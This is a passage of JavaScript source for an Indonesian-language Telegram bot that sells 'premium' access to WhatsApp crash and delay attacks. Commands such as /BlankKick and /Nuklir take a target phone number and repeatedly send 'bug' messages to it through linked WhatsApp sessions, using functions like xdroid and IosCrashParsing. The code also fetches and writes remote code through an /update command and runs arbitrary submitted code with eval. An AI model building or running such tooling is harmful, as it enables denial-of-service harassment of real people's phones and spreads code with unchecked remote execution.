      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 200 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 200 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 100 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 100 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 100 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 }
    ];


    // Jalankan progres bertahap
    for (const stage of Progesbar) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(`
\`\`\`
LOS SANTOS
╰➤ D E L A Y 🦠 B U G
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    }

    // Eksekusi bug setelah progres selesai
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 80; i++) {
    await VnXDelayInvisNewCta(sock, target);
    await VnXDelayInvisNewCta(sock, target);
    sleep(1000);
    
}
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(`
\`\`\`
LOS SANTOS
╰➤ D E L A Y 🦠 B U G
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ✅ Sukses!
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek 𖣂. °Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

// ========= \ DARK - PEMBATAS / =========\\
bot.onText(/\/BlankKick (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const cooldown = checkCooldown(senderId);

  const jid = target;
  const IsTarget = target;

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, pictUrl, {
    caption: `
     ❌ No accses for this command 
    `,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "「 𝐎𝐰𝐧𝐞𝐫 」", url: cfg.URL }],
      ]
    }
  });
}

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /xpair 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(chatId, pictUrl, {
      caption: `
\`\`\`
LOS SANTOS
╰➤ B L A N K 🦠 B U G
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
    });

    // Progress bar bertahap
  const Progesbar = [
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 200 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 200 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 100 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 100 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 100 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 }
    ];


    // Jalankan progres bertahap
    for (const stage of Progesbar) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(`
\`\`\`
LOS SANTOS
╰➤ B L A N K 🦠 B U G
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    }

    // Eksekusi bug setelah progres selesai
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 100; i++) {
    await xdroid(sock, target);
    await xdroid(sock, target);
    await xdroid(sock, target);
    await xdroid(sock, target);
    await xdroid(sock, target);
    sleep(1000);
    
}
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(`
\`\`\`
LOS SANTOS
╰➤ B L A N K 🦠 B U G
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ✅ Sukses!
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek 𖣂. °Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

// ========= \ DARK - PEMBATAS / =========\\
bot.onText(/\/Nuklir (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;
  const cooldown = checkCooldown(senderId);

  const jid = target;
  const IsTarget = target;

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendPhoto(chatId, pictUrl, {
    caption: `
     ❌ No accses for this command 
    `,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "「 𝐎𝐰𝐧𝐞𝐫 」", url: cfg.URL }],
      ]
    }
  });
}

  if (cooldown > 0) {
  return bot.sendMessage(chatId, `Tunggu ${cooldown} detik sebelum mengirim pesan lagi.`);
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /xpair 62xxx"
      );
    }

    // Kirim gambar + caption pertama
    const sentMessage = await bot.sendPhoto(chatId, pictUrl, {
      caption: `
\`\`\`
LOS SANTOS
╰➤ C O M B O B U G
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : 🔄 Mengirim bug...
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [░░░░░░░░░░] 0%
\`\`\`
`, parse_mode: "Markdown"
    });

    // Progress bar bertahap
  const Progesbar = [
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█░░░░░░░░░] 10%", delay: 200 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███░░░░░░░] 30%", delay: 200 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████░░░░░] 50%", delay: 100 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [███████░░░] 70%", delay: 100 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [█████████░] 90%", delay: 100 },
      { text: "▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%\n✅ 𝙎𝙪𝙘𝙘𝙚𝙨𝙨 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝘽𝙪𝙜!", delay: 200 }
    ];


    // Jalankan progres bertahap
    for (const stage of Progesbar) {
      await new Promise(resolve => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(`
\`\`\`
LOS SANTOS
╰➤ C O M B O B U G
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ⏳ Sedang memproses...
 ${stage.text}
\`\`\`
`, { chat_id: chatId, message_id: sentMessage.message_id, parse_mode: "Markdown" });
    }

    // Eksekusi bug setelah progres selesai
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i < 100; i++) {
    await IosCrashParsing(sock, target);
    sleep(1000);
    
}
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    // Update ke sukses + tombol cek target
    await bot.editMessageCaption(`
\`\`\`
LOS SANTOS 
╰➤ C O M B O B U G
 ▢ ᴛᴀʀɢᴇᴛ : ${formattedNumber}
 ▢ 𝑺𝒕𝒂𝒕𝒖𝒔 : ✅ Sukses!
 ▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : [██████████] 100%
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Cek 𖣂. °Target", url: `https://wa.me/${formattedNumber}` }]]
      }
    });

  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

// ========= \ 𝘊𝘈𝘚𝘌 - 𝘜𝘛𝘈𝘔𝘈  / =========\\
bot.onText(/^\/info(?:\s+(.+))?$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const input = match[1]; // link / username
  const reply = msg.reply_to_message;

  try {

    if (reply && reply.from) {
      const u = reply.from;

      const text = `<b>ⓘ. Telegram ⵢ Info</b>\n\n` +
        ` 𖣂. Name : ${u.first_name || "-"} ${u.last_name || ""}\n` +
        `𖣂. User ID : \`${u.id}\`\n` +
        `𖣂. UserName : ${u.username ? "@" + u.username : "-"}\n`;

      return bot.sendMessage(chatId, text, {
        parse_mode: "HTML",
        reply_to_message_id: msg.message_id
      });
    }

    if (input) {
      const username = input
        .replace("https://t.me/", "")
        .replace("@", "")
        .trim();

      const chatInfo = await bot.getChat(username);

      let text = `<b>ⓘ. Telegram ⵢ Info</b>\n\n`;
      text += ` 𖣂. Name : ${chatInfo.title || "-"}\n`;
      text += `𖣂. Type : ${chatInfo.type}\n`;
      text += `𖣂. Chat Id : \`${chatInfo.id}\`\n`;
      text += `𖣂. UserName : ${chatInfo.username ? "@" + chatInfo.username : "-"}\n`;

      return bot.sendMessage(chatId, text, {
        parse_mode: "HTML",
        reply_to_message_id: msg.message_id
      });
    }

    const chat = msg.chat;
    const from = msg.from;

    let text = ` <b>ⓘ. Telegram ⵢ Info</b>\n\n`;

    text += ` 𖣂. Name : ${from.first_name || "-"} ${from.last_name || ""}\n`;
    text += `𖣂. User ID : \`${from.id}\`\n`;
    text += `𖣂. UserName : ${from.username ? "@" + from.username : "-"}\n\n`;

    text += `𖣂. Type chat : ${chat.type}\n`;
    text += `𖣂. Chat Id : \`${chat.id}\`\n`;
    if (chat.title) {
      text += `𖣂. Name Chat : ${chat.title}\n`;
    }

    bot.sendMessage(chatId, text, {
      parse_mode: "HTML",
      reply_to_message_id: msg.message_id
    });

  } catch (err) {
    bot.sendMessage(chatId, "❌ Gagal mengambil info.\nPastikan bot punya akses / bot adalah admin.", {
      reply_to_message_id: msg.message_id
    });
  }
});

// ========= \ DARK - PEMBATAS / =========\\
bot.onText(/\/update/, async (msg) => {
    const chatId = msg.chat.id;

    const urlCase = "https://raw.githubusercontent.com/shinzepelly21/FluxoUpdate/main/zellcase.js";

    bot.sendMessage(chatId, "⏳ Sedang mengecek update...");

    try {
        const { data } = await axios.get(urlCase);

        if (!data) return bot.sendMessage(chatId, "❌ Update gagal: File kosong!");

        fs.writeFileSync("./zellcase.js", data);

        bot.sendMessage(chatId, "✅ Update berhasil!\nSilakan restart bot.");

        process.exit();
    } catch (e) {
        console.log(e);
        bot.sendMessage(chatId, "❌ Update gagal. Pastikan repo dan file index.js tersedia.");
    }
});

bot.onText(/\/credits/, (msg) => {
  const chatId = msg.chat.id;

  const text = `
<blockquote>⊰─「 🍁 𖣂 𝐁𝐨𝐭 ⵢ. 𝐂𝐫𝐞𝐝𝐢𝐭𝐬 」─⊱</blockquote>
  
<b>⊹ ࣪ ˖ Leo ☇ CREATOR/Owner</b>
`;

  bot.sendPhoto(chatId, pictUrl, {
    caption: text,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "Leo ⵢ. Dev",
            url: "https://t.me/leootheman"
          }
        ]
      ]
    }
  });
});

// ========= \ DARK - PEMBATAS / =========\\
bot.onText(/^tofunc$/, async (msg) => {
    const chatId = msg.chat.id;
    if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
    if (!sock || typeof sock.sendMessage !== 'function') {
        return bot.sendMessage(chatId, '❌ WhatsApp session not available or not connected!', {
            reply_to_message_id: msg.message_id
        });
    }
    if (!msg.reply_to_message) {
        return bot.sendMessage(chatId, '❌ Reply pesan yang berisi media!', {
            reply_to_message_id: msg.message_id
        });
    }
    try {
        const repliedMsg = msg.reply_to_message;
        const mediaTypes = ['photo', 'video', 'document', 'audio', 'sticker'];
        if (!mediaTypes.some(type => repliedMsg[type])) {
            return bot.sendMessage(chatId, '❌ Pesan yang dibalas tidak mengandung media!', {
                reply_to_message_id: msg.message_id
            });
        }
        let fileId;
        let whatsappType;
        if (repliedMsg.photo) {
            fileId = repliedMsg.photo[repliedMsg.photo.length - 1].file_id;
            whatsappType = 'image';
        } else if (repliedMsg.video) {
            fileId = repliedMsg.video.file_id;
            whatsappType = 'video';
        } else if (repliedMsg.document) {
            fileId = repliedMsg.document.file_id;
            whatsappType = 'document';
        } else if (repliedMsg.audio) {
            fileId = repliedMsg.audio.file_id;
            whatsappType = repliedMsg.audio.mime_type?.startsWith('audio/ogg') ? 'ptt' : 'audio';
        } else if (repliedMsg.sticker) {
            fileId = repliedMsg.sticker.file_id;
            whatsappType = 'sticker';
        }
        const fileInfo = await bot.getFile(fileId);
        const fileUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileInfo.file_path}`;
        let mime = 'application/octet-stream';
        if (repliedMsg[whatsappType]?.mime_type) {
            mime = repliedMsg[whatsappType].mime_type;
        } else if (whatsappType === 'sticker') {
            mime = repliedMsg.sticker.is_animated ? 'application/x-tgs' : 'image/webp';
        }
        const mediaPayload = {
            [whatsappType]: {
                url: fileUrl,
                mimetype: mime
            }
        };
        const sentMsg = await sock.sendMessage(sock.user.id, mediaPayload);
        if (!sentMsg?.message) {
            throw new Error('Failed to send media - no response from WhatsApp');
        }
        const messageType = Object.keys(sentMsg.message)[0];
        const media = sentMsg.message[messageType];
        await bot.sendMessage(
            chatId,
            `\`\`\`json
type: "${messageType}",
url: "${media.url || null}",
directPath: "${media.directPath || null}",
mimetype: "${media.mimetype || null}",
mediaKey: "${media.mediaKey?.toString('base64') || null}",
fileEncSha256: "${media.fileEncSha256?.toString('base64') || null}",
fileSha256: "${media.fileSha256?.toString('base64') || null}",
fileLength: "${media.fileLength || null}",
mediaKeyTimestamp: "${media.mediaKeyTimestamp || null}"\`\`\``,
            {
                reply_to_message_id: msg.message_id,
                parse_mode: "Markdown",
                reply_markup: {
            inline_keyboard: [
                [
                 { text: "「 𝐎𝐰𝐧𝐞𝐫 」", url: "t.me/YanzNotDev11" }
               ]
            ]
         }
      });
    } catch (err) {
        console.error('Error in /tobase command:', err);    
        let errorMsg = '❌ Gagal mengirim media.';
        if (err.message.includes('not connected')) {
            errorMsg = '❌ WhatsApp session not connected!';
        } else if (err.message.includes('ENOENT')) {
            errorMsg = '❌ File not found on Telegram servers!';
        } else {
            errorMsg += ` Error: ${err.message}`;
        }
        await bot.sendMessage(chatId, errorMsg, {
            reply_to_message_id: msg.message_id
        });
    }
});

// ========= \ DARK - PEMBATAS / =========\\
// ========= \ 𝘊𝘈𝘚𝘌 - 𝘗𝘓𝘜𝘎𝘐𝘕𝘚  / =========\\
bot.onText(/\/xpair (.+)/, async (msg, match) => {
const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
    return bot.sendPhoto(chatId, pictUrl, {
      caption: `
<blockquote>Owner & Admin Acces</blockquote>
<b>Please Buy Acces To Author</b>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "「 𝐎𝐰𝐧𝐞𝐫 」", url: cfg.URL }]
        ]
      }
    });
  }

  if (!match[1]) {
    return bot.sendMessage(chatId, "❌ Missing input. Please provide the number. Example: /xpair 62xx.");
  }
  
  const botNumber = match[1].replace(/[^0-9]/g, "");

  if (!botNumber || botNumber.length < 10) {
    return bot.sendMessage(chatId, "❌ Nomor yang diberikan tidak valid. Pastikan nomor yang dimasukkan benar.");
  }

  try {
    await ConnectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in Connect:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

bot.onText(/\/setcd (\d+[smh])/, (msg, match) => { 
const chatId = msg.chat.id; 
const response = setCooldown(match[1]);

bot.sendMessage(chatId, response); });

const moment = require('moment');

// ========= \ DARK - PEMBATAS / =========\\
bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, "❌ You are not authorized to add premium users.");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID and duration. Example: /addprem 6843967527 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "❌ Missing input. Please specify a duration. Example: /addprem 6843967527 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number. Example: /addprem 6843967527 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "❌ Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `✅ User ${userId} has been added to the premium list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
      savePremiumUsers();
      bot.sendMessage(chatId, `✅ User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});

// ========= \ DARK - PEMBATAS / =========\\
bot.onText(/\/listprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "❌ You are not authorized to view the premium list.");
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```ＬＩＳＴ ＰＲＥＭＩＵＭ\n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
    message += `${index + 1}. ID: \`${user.id}\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});

// ========= \ DARK - PEMBATAS / =========\\
bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /addadmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /addadmin 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is already an admin.`);
    }
});

// ========= \ DARK - PEMBATAS / =========\\
bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ You are not authorized to remove premium users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "❌ Please provide a user ID. Example: /delprem 6843967527");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `❌ User ${userId} is not in the premium list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `✅ User ${userId} has been removed from the premium list.`);
});

// ========= \ DARK - PEMBATAS / =========\\
bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "❌ Missing input. Please provide a user ID. Example: /deladmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "❌ Invalid input. Example: /deladmin 6843967527.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `✅ User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `❌ User ${userId} is not an admin.`);
    }
});

// ========= \ 𝘊𝘈𝘚𝘌 - 𝘚𝘗𝘌𝘚𝘐𝘈𝘓𝘐𝘚 / =========\\

// ========= \ DARK - PEMBATAS / =========\\
bot.onText(/\/tesfunc (\d+),(\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userId = msg.from.id;
  const targetNumber = match[1];
  const loopCount = parseInt(match[2]);
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}@s.whatsapp.net`;

  // ✅ try utama dibuka
  try {
    if (sessions.size === 0) {
      return bot.sendMessage(chatId, "Tidak Ada Sender WhatsApp yang terhubung 🪧 ☇ Format: /addsender 628xx");
    }

    if (!msg.reply_to_message) {
      return bot.sendMessage(chatId, "❌ Reply pesan ini ke file JavaScript atau kode function yang ingin di-test!");
    }

    const repliedMsg = msg.reply_to_message;

    try {
      let testFunction;

      if (repliedMsg.document && repliedMsg.document.file_name.endsWith('.js')) {
        const fileLink = await bot.getFileLink(repliedMsg.document.file_id);
        const response = await fetch(fileLink);
        const fileContent = await response.text();

        const funcMatch = fileContent.match(/async\s+function\s+(\w+)\s*\([^)]*\)\s*{[\s\S]*?}/);
        if (!funcMatch) {
          return bot.sendMessage(chatId, "❌ File JavaScript tidak mengandung async function yang valid!");
        }

        eval(fileContent);
        testFunction = eval(funcMatch[1]);
      } else if (repliedMsg.text) {
        const funcMatch = repliedMsg.text.match(/async\s+function\s+(\w+)\s*\([^)]*\)\s*{[\s\S]*?}/);
        if (!funcMatch) {
          return bot.sendMessage(chatId, "❌ Kode tidak mengandung async function yang valid!");
        }

        eval(repliedMsg.text);
        testFunction = eval(funcMatch[1]);
      } else {
        return bot.sendMessage(chatId, "❌ Format tidak didukung! Kirim file .js atau kode function.");
      }

      if (typeof testFunction !== 'function') {
        return bot.sendMessage(chatId, "❌ Gagal memuat function!");
      }

      const progressMsg = await bot.sendMessage(chatId, `🔄 Memulai test function...\nTarget: ${formattedNumber}\nLoop: ${loopCount}x\nStatus: Processing...`);

      let successCount = 0;
      let errorCount = 0;
      const errors = [];

      for (let i = 0; i < loopCount; i++) {
        try {
          await testFunction(sock, target);
          await sleep(1000);
          successCount++;

          if (i % Math.ceil(loopCount / 10) === 0) {
            const progress = Math.round((i / loopCount) * 100);
            await bot.editMessageText(`🔄 Testing function...\nTarget: ${formattedNumber}\nLoop: ${i + 1}/${loopCount}\nProgress: █${'█'.repeat(progress / 10)}${'░'.repeat(10 - progress / 10)} ${progress}%\n✅ Success: ${successCount}\n❌ Error: ${errorCount}`, {
              chat_id: chatId,
              message_id: progressMsg.message_id
            });
          }

          await sleep(1500);
        } catch (err) {
          errorCount++;
          errors.push(`Loop ${i + 1}: ${err.message}`);
          console.error(`Error di loop ${i + 1}:`, err);
        }
      }

      let resultText = `📊 **TEST RESULTS**\n\n`;
      resultText += `🎯 Target: ${formattedNumber}\n`;
      resultText += `🔄 Total Loop: ${loopCount}x\n`;
      resultText += `✅ Success: ${successCount}\n`;
      resultText += `❌ Error: ${errorCount}\n`;
      resultText += `📈 Success Rate: ${((successCount / loopCount) * 100).toFixed(2)}%\n\n`;

      if (errors.length > 0) {
        resultText += `🚨 **ERROR DETAILS:**\n`;
        resultText += errors.slice(0, 5).join('\n');
        if (errors.length > 5) {
          resultText += `\n... dan ${errors.length - 5} error lainnya`;
        }
      }

      await bot.editMessageText(resultText, {
        chat_id: chatId,
        message_id: progressMsg.message_id,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [{ text: "Cek 𖣂. °Target", url: `wa.me/${formattedNumber}` }]
          ]
        }
      });
    } catch (error) {
      bot.sendMessage(chatId, `❌ Error saat testing: ${error.message}`);
    }

  // ✅ ini penutup try utama
  } catch (e) {
    console.error("Error utama:", e);
    bot.sendMessage(chatId, `❌ Terjadi kesalahan utama: ${e.message}`);
  }
});

// ========= \ 𝘊𝘈𝘚𝘌 - 𝘛𝘖𝘖𝘓𝘚 / =========\\
const iqcSessions = {};
bot.onText(/^\/ssip(.*)/, async (msg, match) => {
  const chatId = msg.chat.id;
  try {
    const args = msg.text.split(" ").slice(1);
    if (args.length < 3) {
      return bot.sendMessage(
        chatId,
        "❌ Format : `/ssiphone 12:00 100 Your Message`",
        { parse_mode: "Markdown" }
      );
    }

    const time = args[0];
    const battery = args[1];
    const message = args.slice(2).join(" ");

    iqcSessions[chatId] = { time, battery, message };

    await bot.sendMessage(chatId, "Pilih Provider favorite kamu", {
      reply_markup: {
        inline_keyboard: [
          [
            { text: "Axis", callback_data: "iqc_provider_Axis" },
            { text: "Telkomsel", callback_data: "iqc_provider_Telkomsel" }
          ],
          [
            { text: "Indosat", callback_data: "iqc_provider_Indosat" },
            { text: "IM3", callback_data: "iqc_provider_IM3" }
          ]
        ]
      }
    });
  } catch (err) {
    console.error("Failed /iqc:", err.message);
    bot.sendMessage(chatId, "Terjadi kesalahan saat memproses IQC.");
  }
});

// ========= \ DARK - PEMBATAS / =========\\
bot.on("callback_query", async (query) => {
  const chatId = query.message.chat.id;
  try {
    if (!query.data.startsWith("iqc_provider_")) return;

    const provider = query.data.replace("iqc_provider_", "");
    const data = iqcSessions[chatId];

    if (!data) {
      return bot.sendMessage(chatId, "Data IQC tidak ditemukan. Jalankan command /iqc lagi.");
    }

    const { time, battery, message } = data;
    await bot.answerCallbackQuery(query.id, { text: "Diproses..." });
    await bot.sendMessage(chatId, "Sedang membuat gambar...");

    const apiUrl = `https://joocode.zone.id/api/iqc?t=${encodeURIComponent(
      time
    )}&b=${encodeURIComponent(battery)}&m=${encodeURIComponent(
      message
    )}&p=${encodeURIComponent(provider)}`;

    await bot.sendPhoto(chatId, apiUrl, {
